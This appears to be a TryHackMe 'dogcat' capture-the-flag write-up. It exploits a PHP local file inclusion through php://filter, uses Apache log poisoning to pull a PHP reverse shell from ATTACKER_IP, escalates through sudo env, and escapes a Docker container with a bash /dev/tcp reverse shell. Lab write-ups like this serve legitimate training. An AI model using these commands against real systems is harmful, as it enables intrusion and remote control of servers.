# [dogcat](https://tryhackme.com/room/dogcat)

## I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.

---

### What is flag 1?

_There's more to *view* than just cats and dogs..._

1. Perform directory enumeration to discover hidden files and directories on the web server

```bash
gobuster dir -u http://IP -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,js
```

[SCREEN01]

2. The `http://IP/?view=php://filter/convert.base64-encode/resource=cat/../flag` url returns `PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=` which is Base64 encoded flag:

[SCREEN02]

[SCREEN03]

---

### What is flag 2?

1. Access the index.php file in `http://IP/?view=php://filter/convert.base64-encode/resource=cat/../index` to understand the application structure

2. Access Apache access logs in `http://IP/?view=cat/../../../../../var/log/apache2/access.log&ext=` for log poisoning

3. Execute reverse shell through log poisoning attack
   - Create netcat listener on attacking machine
   - Create Python HTTP server to serve the PHP reverse shell
   - Create [php reverse shell file](https://github.com/mosec0/Reverse-Shell/blob/main/reverse-shell.php)
   - Inject PHP code into logs via User-Agent header. The curl command might need to be executed twice
   - Navigate to `http://IP/shell.php` to execute the reverse shell

```bash
nc -lvnp 4444
```

```bash
python -m SimpleHTTPServer
```

```bash
curl -A "<?php file_put_contents('shell.php', file_get_contents('http://ATTACKER_IP:8000/shell.php')); ?>" "http://TARGET_IP?view=/cat/../../../../var/log/apache2/access.log&ext"
```

4. With reverse shell executed, locate the second flag

```bash
find / -type f -name "*flag2*" 2>/dev/null
cat /var/www/flag2_QMW7JvaY2LvK.txt
```

[SCREEN04]

---

### What is flag 3?

1. Upgrade shell, check for sudo privileges, and escalate to root

```bash
script /dev/null -c bash
sudo -l
sudo /usr/bin/env /bin/bash
```

[SCREEN05]

2. Find the third flag with root privileges

```bash
find / -type f -name "*flag3*" 2>/dev/null
cat /root/flag3.txt
```

[SCREEN06]

---

### What is flag 4?

1. Investigate backup scripts that may be executed automatically

```bash
ls -la /opt/backups
cat /opt/backups/backup.sh
```

[SCREEN07]

2. Set up listener and modify backup script for container escape

```bash
nv -lvnp 5555
```

```bash
cd /opt/backups
printf '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1' > backup.sh
```

[SCREEN08]

3. Wait for the automated execution and retrieve the fourth flag

```bash
cat flag4.txt
```

[SCREEN09]
